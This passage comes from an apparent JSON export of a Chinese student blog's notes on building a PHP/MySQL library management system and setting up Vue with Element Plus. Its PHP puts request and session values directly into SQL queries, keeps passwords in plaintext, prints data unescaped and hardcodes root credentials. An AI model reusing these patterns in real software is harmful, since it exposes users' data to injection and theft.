&quot; . mysqli_connect_error());&#125;// 获取当前用户的借阅记录$sql = &quot;SELECT * FROM borrow_records WHERE username = &#x27;&quot;.$_SESSION[&quot;username&quot;].&quot;&#x27;&quot;;$result = mysqli_query($conn, $sql);// 输出每一条借阅记录while($row = mysqli_fetch_assoc($result)) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;book_id&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;borrow_date&quot;].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;&#125;mysqli_close($conn);?&gt; 图书管理后台利用element插件和js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;el-container&gt; &lt;el-aside class=&quot;ce&quot;&gt; &lt;el-row class=&quot;tac&quot;&gt; &lt;el-col :span=&quot;24&quot;&gt; &lt;el-menu default-active=&quot;2&quot; class=&quot;el-menu-vertical-demo&quot; @open=&quot;handleOpen&quot; @close=&quot;handleClose&quot; background-color=&quot;#545c64&quot; text-color=&quot;#fff&quot; active-text-color=&quot;#ffd04b&quot;&gt; &lt;el-submenu index=&quot;1&quot;&gt; &lt;template slot=&quot;title&quot;&gt; &lt;i class=&quot;el-icon-location&quot;&gt;&lt;/i&gt; &lt;span&gt;后台管理增删改查&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item-group&gt; &lt;el-menu-item index=&quot;1-1&quot; @click=&quot;router()&quot;&gt;用户&lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;1-2&quot; @click=&quot;router2()&quot;&gt;书籍&lt;/el-menu-item&gt; &lt;/el-menu-item-group&gt; &lt;/el-submenu&gt; &lt;el-submenu index=&quot;2&quot;&gt; &lt;template slot=&quot;title&quot;&gt; &lt;i class=&quot;el-icon-location&quot;&gt;&lt;/i&gt; &lt;span&gt;图书管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item-group&gt; &lt;el-menu-item index=&quot;2-1&quot; @click=&quot;router3()&quot;&gt;中国书籍&lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;2-2&quot; @click=&quot;router()&quot;&gt;国外书籍&lt;/el-menu-item&gt; &lt;/el-menu-item-group&gt; &lt;/el-submenu&gt; &lt;el-menu-item index=&quot;3&quot; @click=&quot;router()&quot;&gt; &lt;i class=&quot;el-icon-document&quot;&gt;&lt;/i&gt; &lt;span slot=&quot;title&quot;&gt;借阅中心&lt;/span&gt; &lt;/el-menu-item&gt; &lt;/el-menu&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;/el-aside&gt; &lt;el-container&gt; &lt;el-header&gt; &lt;el-col :span=&quot;24&quot;&gt; &lt;el-card shadow=&quot;never&quot;&gt; &lt;el-breadcrumb separator=&quot;/&quot;&gt; &lt;h1 action=&quot;new.php&quot;&gt; &lt;el-icon&gt; &lt;Expand /&gt; &lt;/el-icon&gt;首页 &lt;/h1&gt; &lt;h1&gt;欢迎来到图书管理系统&lt;/h1&gt; &lt;/el-breadcrumb&gt; &lt;/el-card&gt; &lt;/el-col&gt; &lt;/el-header&gt; &lt;el-main&gt; &lt;iframe :src=&quot;iframeSrc&quot; frameborder=&quot;false&quot; style=&quot;top:80px;left: 120px;width: 100%;height: 500px&quot;&gt;&lt;el-calendar v-model=&quot;value&quot;&gt; &lt;/el-calendar&gt;&lt;/iframe&gt; &lt;/el-main&gt; &lt;/el-container&gt; &lt;/el-container&gt; &lt;/div&gt; &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt; &lt;script&gt; new Vue(&#123; el: &#x27;#app&#x27;, data: function () &#123; return &#123; visible: false, iframeSrc: &#x27;&#x27;, &#125; &#125;, methods: &#123; handleOpen(key, keyPath) &#123; console.log(key, keyPath); &#125;, handleClose(key, keyPath) &#123; console.log(key, keyPath); &#125; &#125;, methods: &#123; router() &#123; this.iframeSrc = &quot;admin.php&quot; &#125;, router2() &#123; this.iframeSrc = &quot;admin2.php&quot; &#125;, router3() &#123; this.iframeSrc = &quot;fetch_borrow_records.php&quot; &#125; &#125; &#125;) &lt;/script&gt; &lt;style&gt; .ce &#123; height: 98vh; width: 20vh; background: #545C64; margin: 0; box-shadow: none; &#125; &lt;/style&gt;&lt;/body&gt;&lt;/html&gt; 用户管理系统 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;用户管理系统&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; &#125; h1 &#123; text-align: center; padding: 20px 0; background-color: #333; color: #fff; &#125; form &#123; width: 80%; margin: 20px auto; padding: 20px; background-color: #fff; border-radius: 5px; &#125; label &#123; display: block; margin-bottom: 10px; &#125; input[type=&quot;text&quot;], input[type=&quot;password&quot;] &#123; width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 5px; &#125; table &#123; width: 80%; margin: 20px auto; border-collapse: collapse; &#125; th, td &#123; padding: 10px; border: 1px solid #ddd; &#125; th &#123; background-color: #333; color: #fff; &#125; a &#123; margin-right: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;用户管理系统&lt;/h1&gt; &lt;form method=&quot;post&quot; action=&quot;&quot;&gt; &lt;label for=&quot;username&quot;&gt;用户名&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;&lt;br /&gt; &lt;label for=&quot;password&quot;&gt;密码&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;add&quot; value=&quot;添加用户&quot;&gt; &lt;/form&gt; &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27;) &#123; if (isset($_POST[&#x27;add&#x27;]) &amp;&amp; !empty($_POST[&#x27;username&#x27;]) &amp;&amp; !empty($_POST[&#x27;password&#x27;])) &#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;); mysqli_query($link, &quot;set names utf8&quot;); $insert = &quot;INSERT INTO users (username, password) VALUES(&#x27;$username&#x27;, &#x27;$password&#x27;)&quot;; if (mysqli_query($link, $insert)) &#123; echo &quot;用户添加成功&quot;; &#125; else &#123; echo &quot;用户添加失败&quot;; &#125; mysqli_close($link); &#125; &#125; if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;GET&#x27; &amp;&amp; $_GET[&#x27;action&#x27;] == &#x27;delete&#x27;) &#123; $id = $_GET[&#x27;id&#x27;]; $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;); mysqli_query($link, &quot;set names utf8&quot;); $delete = &quot;DELETE FROM users WHERE id = $id&quot;; if (mysqli_query($link, $delete)) &#123; echo &quot;用户删除成功&quot;; &#125; else &#123; echo &quot;用户删除失败&quot;; &#125; mysqli_close($link); &#125; if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;GET&#x27; &amp;&amp; $_GET[&#x27;action&#x27;] == &#x27;update&#x27;) &#123; $id = $_GET[&#x27;id&#x27;]; $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;); mysqli_query($link, &quot;set names utf8&quot;); $select = &quot;SELECT * FROM users WHERE id = $id&quot;; $result = mysqli_query($link, $select); $row = mysqli_fetch_assoc($result); echo &quot;&lt;form method=&#x27;post&#x27; action=&#x27;&#x27;&gt; &lt;label for=&#x27;username&#x27;&gt;用户名&lt;/label&gt;&lt;br /&gt; &lt;input type=&#x27;text&#x27; id=&#x27;username&#x27; name=&#x27;username&#x27; value=&#x27;&#123;$row[&#x27;username&#x27;]&#125;&#x27;&gt;&lt;br /&gt; &lt;label for=&#x27;password&#x27;&gt;密码&lt;/label&gt;&lt;br /&gt; &lt;input type=&#x27;password&#x27; id=&#x27;password&#x27; name=&#x27;password&#x27; value=&#x27;&#123;$row[&#x27;password&#x27;]&#125;&#x27;&gt;&lt;br /&gt; &lt;input type=&#x27;hidden&#x27; name=&#x27;id&#x27; value=&#x27;$id&#x27;&gt; &lt;input type=&#x27;submit&#x27; name=&#x27;update&#x27; value=&#x27;更新用户&#x27;&gt; &lt;/form&gt;&quot;; &#125; elseif ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27; &amp;&amp; isset($_POST[&#x27;update&#x27;])) &#123; $id = $_POST[&#x27;id&#x27;]; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;); mysqli_query($link, &quot;set names utf8&quot;); $update = &quot;UPDATE users SET username = &#x27;$username&#x27;, password = &#x27;$password&#x27; WHERE id = $id&quot;; if (mysqli_query($link, $update)) &#123; echo &quot;用户更新成功&quot;; &#125; else &#123; echo &quot;用户更新失败&quot;; &#125; mysqli_close($link); &#125; $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;); mysqli_query($link, &quot;set names utf8&quot;); $show =&quot;SELECT * FROM users ORDER BY id DESC LIMIT 20&quot;; $result = mysqli_query($link, $show); if ($result) &#123; echo &quot;&lt;table&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;用户&lt;/th&gt;&lt;th&gt;密码&lt;/th&gt;&lt;th&gt;操作&lt;/th&gt;&lt;/tr&gt;&quot;; while ($row = mysqli_fetch_assoc($result)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&#x27;username&#x27;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&#x27;password&#x27;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&lt;a href=&#x27;?action=delete&amp;id=&#123;$row[&#x27;id&#x27;]&#125;&#x27;&gt;删除&lt;/a&gt; | &lt;a href=&#x27;?action=update&amp;id=&#123;$row[&#x27;id&#x27;]&#125;&#x27;&gt;修改&lt;/a&gt;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&quot;; &#125; else &#123; echo &quot;获取名单失败&quot;; &#125; mysqli_close($link); ?&gt;&lt;/body&gt;&lt;/html&gt; 书籍管理系统 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;书籍管理系统&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;书籍管理系统&lt;/h1&gt; &lt;form method=&quot;post&quot; action=&quot;&quot;&gt; &lt;label for=&quot;name&quot;&gt;书籍名字&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot;&gt;&lt;br /&gt; &lt;label for=&quot;author&quot;&gt;作者&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; id=&quot;author&quot; name=&quot;author&quot;&gt;&lt;br /&gt; &lt;label for=&quot;year&quot;&gt;出版年份&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; id=&quot;year&quot; name=&quot;year&quot;&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;add&quot; value=&quot;添加书籍&quot;&gt; &lt;/form&gt; &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27;) &#123; if (isset($_POST[&#x27;add&#x27;]) &amp;&amp; !empty($_POST[&#x27;name&#x27;]) &amp;&amp; !empty($_POST[&#x27;author&#x27;]) &amp;&amp; !empty($_POST[&#x27;year&#x27;])) &#123; $name = $_POST[&#x27;name&#x27;]; $author = $_POST[&#x27;author&#x27;]; $year = $_POST[&#x27;year&#x27;]; $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;); mysqli_query($link, &quot;set names utf8&quot;); $insert = &quot;INSERT INTO books (name, author, year) VALUES(&#x27;$name&#x27;, &#x27;$author&#x27;, &#x27;$year&#x27;)&quot;; if (mysqli_query($link, $insert)) &#123; echo &quot;书籍添加成功&quot;; &#125; else &#123; echo &quot;书籍添加失败&quot;; &#125; mysqli_close($link); &#125; &#125; $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;连接失败&quot;); mysqli_query($link, &quot;set names utf8&quot;); $show =&quot;SELECT * FROM books ORDER BY id DESC LIMIT 20&quot;; $result = mysqli_query($link, $show); if ($result) &#123; echo &quot;&lt;table&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;书籍名字&lt;/th&gt;&lt;th&gt;作者&lt;/th&gt;&lt;th&gt;出版年份&lt;/th&gt;&lt;/tr&gt;&quot;; while ($row = mysqli_fetch_assoc($result)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&#x27;name&#x27;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&#x27;author&#x27;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&#x27;year&#x27;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&quot;; &#125; else &#123; echo &quot;获取书籍列表失败&quot;; &#125; mysqli_close($link); ?&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"图书管理系统","slug":"图书管理系统","permalink":"http://zhoumuyun.com/tags/%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"}]},{"title":"vue和element的使用","slug":"vue和element的使用","date":"2023-12-16T14:02:04.000Z","updated":"2023-12-16T14:16:57.099Z","comments":true,"path":"2023/12/16/vue和element的使用/","link":"","permalink":"http://zhoumuyun.com/2023/12/16/vue%E5%92%8Celement%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"此篇介绍了vue的安装和element组件的组装","text":"此篇介绍了vue的安装和element组件的组装 vue的安装 pm create vue@latest #创建文件 npm install element-plus –save #安装element插件 npm install -D unplugin-vue-components unplugin-auto-import #安装组件 要更改三个配置文件 main.js的配置文件 123456import &#123; createApp &#125; from &#x27;vue&#x27; import App from &#x27;./App.vue&#x27; import ElementPlus from &#x27;element-plus&#x27;; import &#x27;element-plus/dist/index.css&#x27; createApp(App).mount(&#x27;#app&#x27;) app.vue的代码解释 1234src/App.vue是入口文件&lt;script setup&gt;&lt;/script&gt;。 //导包&lt;template&gt;&lt;/template&gt;。 //html部分&lt;style scoped&gt;&lt;/style&gt; //css部分 vite.config.js的配置文件 1234567891011121314151617181920212223242526import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27; import &#123; defineConfig &#125; from &#x27;vite&#x27; import vue from &#x27;@vitejs/plugin-vue&#x27; import AutoImport from &#x27;unplugin-auto-import/vite&#x27; import Components from &#x27;unplugin-vue-components/vite&#x27; import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27; // https://vitejs.dev/config/ export default defineConfig(&#123; plugins: [ vue(), // ... AutoImport(&#123; resolvers: [ElementPlusResolver()], &#125;), Components(&#123; resolvers: [ElementPlusResolver()], &#125;), ], resolve: &#123; alias: &#123; &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url)) &#125; &#125; &#125;) element主题 最后的样式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278&lt;script setup&gt; import &#123; Delete, Edit, Search, Share, Upload, User, Menu as IconMenu, Setting, Shop, Tickets, PieChart, Expand, Star, Message, &#125; from &quot;@element-plus/icons-vue&quot;; //导入一些element上面的组件 const tableData = [ //导入表格数据 &#123; number: &quot;1&quot;, name: &quot;周杰伦&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, &#123; number: &quot;2&quot;, name: &quot;刘德华&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, &#123; number: &quot;3&quot;, name: &quot;张学友&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, &#123; number: &quot;4&quot;, name: &quot;周星驰&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, &#123; number: &quot;5&quot;, name: &quot;梁朝伟&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, &#123; number: &quot;6&quot;, name: &quot;马云&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, &#123; number: &quot;7&quot;, name: &quot;刘备&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, &#123; number: &quot;9&quot;, name: &quot;关羽&quot;, address: &quot;中国&quot;, date: &quot;2016-05-03&quot;, juese: &quot;歌手&quot;, status: &quot;休息&quot;, email: &quot;lxz@gmail.com&quot;, &#125;, ];&lt;/script&gt;&lt;template&gt; &lt;div class=&quot;common-layout&quot;&gt; &lt;el-container&gt; //一个大容器 &lt;el-aside class=&quot;CE&quot;&gt; &lt;el-col :span=&quot;24&quot;&gt;//侧边栏 &lt;h1 class=&quot;title&quot;&gt;&lt;/h1&gt; &lt;el-menu active-text-color=&quot;#ffd04b&quot; background-color=&quot;#283747&quot; class=&quot;el-menu-vertical-demo&quot; default-active=&quot;2&quot; text-color=&quot;#fff&quot; @open=&quot;handleOpen&quot; @close=&quot;handleClose&quot; &gt; &lt;el-sub-menu index=&quot;1&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;User /&gt;&lt;/el-icon&gt; &lt;span&gt;用户管理&lt;/span&gt; &lt;/template&gt;&lt;el-menu-item-group title=&quot;&quot;&gt; &lt;el-menu-item index=&quot;1-1&quot;&gt; &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;用户列表&lt;/el-menu-item &gt;&lt;/el-menu-item-group&gt;&lt;!-- &lt;el-sub-menu index=&quot;1-4&quot;&gt;&lt;template #title&gt;item four&lt;/template&gt;&lt;el-menu-item index=&quot;1-4-1&quot;&gt;item one&lt;/el-menu-item&gt;&lt;/el-sub-menu&gt; --&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;2&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;Setting /&gt;&lt;/el-icon&gt; &lt;span&gt;权限管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item-group title=&quot;&quot;&gt; &lt;el-menu-item index=&quot;1-1&quot;&gt; &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;用户列表&lt;/el-menu-item &gt; &lt;/el-menu-item-group&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;3&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;Shop /&gt;&lt;/el-icon&gt; &lt;span&gt;商品管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item-group title=&quot;&quot;&gt; &lt;el-menu-item index=&quot;1-1&quot;&gt; &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;用户列表&lt;/el-menu-item &gt; &lt;/el-menu-item-group&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;4&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;Tickets /&gt;&lt;/el-icon&gt; &lt;span&gt;订单管理&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item-group title=&quot;&quot;&gt; &lt;el-menu-item index=&quot;1-1&quot;&gt; &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;用户列表&lt;/el-menu-item &gt; &lt;/el-menu-item-group&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;5&quot;&gt; &lt;template #title&gt; &lt;el-icon&gt;&lt;PieChart /&gt;&lt;/el-icon&gt; &lt;span&gt;数据统计&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item-group title=&quot;&quot;&gt; &lt;el-menu-item index=&quot;1-1&quot;&gt; &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;用户列表&lt;/el-menu-item &gt; &lt;/el-menu-item-group&gt; &lt;/el-sub-menu&gt; &lt;!-- &lt;el-menu-item index=&quot;2&quot;&gt; &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt; &lt;span&gt;功能二&lt;/span&gt; &lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;3&quot; disabled&gt; &lt;el-icon&gt;&lt;document /&gt;&lt;/el-icon&gt; &lt;span&gt;功能三&lt;/span&gt; &lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;4&quot;&gt; &lt;el-icon&gt;&lt;setting /&gt;&lt;/el-icon&gt; &lt;span&gt;功能四&lt;/span&gt; &lt;/el-menu-item&gt; --&gt; &lt;/el-menu&gt; &lt;/el-col&gt; &lt;/el-aside&gt; &lt;el-container&gt; &lt;el-header&gt; &lt;el-col :span=&quot;24&quot;&gt; &lt;el-card shadow=&quot;never&quot;&gt; &lt;el-breadcrumb separator=&quot;/&quot;&gt; &lt;el-breadcrumb-item :to=&quot;&#123; path: &#x27;/&#x27; &#125;&quot; &gt;&lt;h1&gt; &lt;el-icon&gt;&lt;Expand /&gt;&lt;/el-icon&gt;首页 &lt;/h1&gt;&lt;/el-breadcrumb-item &gt; &lt;el-breadcrumb-item&gt;&lt;h1&gt;用户列表&lt;/h1&gt;&lt;/el-breadcrumb-item&gt; &lt;/el-breadcrumb&gt; &lt;/el-card&gt; &lt;/el-col&gt; &lt;/el-header&gt; &lt;el-main&gt; &lt;el-card class=&quot;box-card&quot;&gt; &lt;div class=&quot;text item&quot;&gt; &lt;el-input class=&quot;input&quot; v-model=&quot;input&quot; placeholder=&quot;请输入要搜索的用户名&quot; /&gt; &lt;el-button type=&quot;primary&quot;&gt;搜索&lt;/el-button&gt; &lt;el-button type=&quot;primary&quot;&gt;添加用户&lt;/el-button&gt; &lt;el-table :data=&quot;tableData&quot; class=&quot;table&quot;&gt; &lt;el-table-column prop=&quot;number&quot; label=&quot;#&quot; width=&quot;60&quot; /&gt; &lt;el-table-column prop=&quot;name&quot; label=&quot;姓名&quot; width=&quot;180&quot; /&gt; &lt;el-table-column prop=&quot;email&quot; label=&quot;邮箱&quot; /&gt; &lt;el-table-column prop=&quot;juese&quot; label=&quot;角色&quot; /&gt; &lt;el-table-column prop=&quot;status&quot; label=&quot;状态&quot; /&gt; &lt;el-table-column prop=&quot;date&quot; label=&quot;创建时间&quot; /&gt; &lt;el-table-column prop=&quot;make&quot; label=&quot;操作&quot;&gt; &lt;el-button type=&quot;info&quot; :icon=&quot;Message&quot; circle /&gt; &lt;el-button type=&quot;warning&quot; :icon=&quot;Star&quot; circle /&gt; &lt;el-button type=&quot;danger&quot; :icon=&quot;Delete&quot; circle /&gt; &lt;/el-table-column&gt; &lt;/el-table&gt; &lt;el-pagination v-model:current-page=&quot;currentPage4&quot; v-model:page-size=&quot;pageSize4&quot; :page-sizes=&quot;[100, 200, 300, 400]&quot; :small=&quot;small&quot; :disabled=&quot;disabled&quot; :background=&quot;background&quot; layout=&quot;total, sizes, prev, pager, next, jumper&quot; :total=&quot;400&quot; @size-change=&quot;handleSizeChange&quot; @current-change=&quot;handleCurrentChange&quot; /&gt; &lt;/div&gt; &lt;/el-card&gt; &lt;/el-main&gt; &lt;/el-container&gt; &lt;/el-container&gt; &lt;/div&gt;&lt;/template&gt;&lt;style scoped&gt;.CE &#123; width: 15vw; background: #283747; height: 100vh;&#125;.table&#123; width: 100%; height: 50vh; &#125;.title &#123; display: flex; justify-content: center; align-items: center;&#125;.input &#123; margin-top: 10px; margin-bottom: 10px; width: 30vh; padding: 10px;&#125;.text &#123; font-size: 14px;&#125;.item &#123; padding: 10px;&#125;.box-card &#123; width: 80.5vw; margin-top: 3vh; height: 85vh;&#125;&lt;/style&gt;","categories":[{"name":"上课笔记","slug":"上课笔记","permalink":"http://zhoumuyun.com/categories/%E4%B8%8A%E8%AF%BE%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"php学习","slug":"php学习","date":"2023-12-16T13:23:11.000Z","updated":"2023-12-17T01:46:13.574Z","comments":true,"path":"2023/12/16/php学习/","link":"","permalink":"http://zhoumuyun.com/2023/12/16/php%E5%AD%A6%E4%B9%A0/","excerpt":"这篇介绍了php语言的用法，连接数据库，和php和MySQL的一些函数","text":"这篇介绍了php语言的用法，连接数据库，和php和MySQL的一些函数 简单交互打开Apache和MySql 连接数据库，打开navicat ， 文件—-&gt;新建连接—-&gt;新建连接 名字可以随便取 地址就填连接数据库的ip地址 在数据库里面建立自己的库和表单 打开网站根目录 创建两个文件进行修改 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;post&quot;action=&quot;link.php&quot;&gt; &lt;tr&gt; &lt;td&gt;用户名&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt;&lt;br&gt; &lt;tr&gt; &lt;td&gt;密码&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt;&lt;br&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;checkbox&quot; name=&quot;remeber&quot; value=&quot;yes&quot;&gt;记住密码&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt;&lt;br&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122&lt;?phpheader(&#x27;content-type:text/html;charset=utf-8&#x27;);//isset 判断有没有值 trim 可以把字符串的所有空格去掉//mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,security) or exit(&quot;Error connecting&quot;);//mysqli_query(&quot;数据库名字&quot;，&quot;执行语句 set names utf8&quot;);if (isset($_POST[&#x27;submit&#x27;])) &#123; //数据交互 $u = trim($_POST[&#x27;username&#x27;]); $p = trim($_POST[&#x27;password&#x27;]); $link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;Error connecting&quot;);//将这个链接赋值给link mysqli_query($link, &quot;set name utf8&quot;); 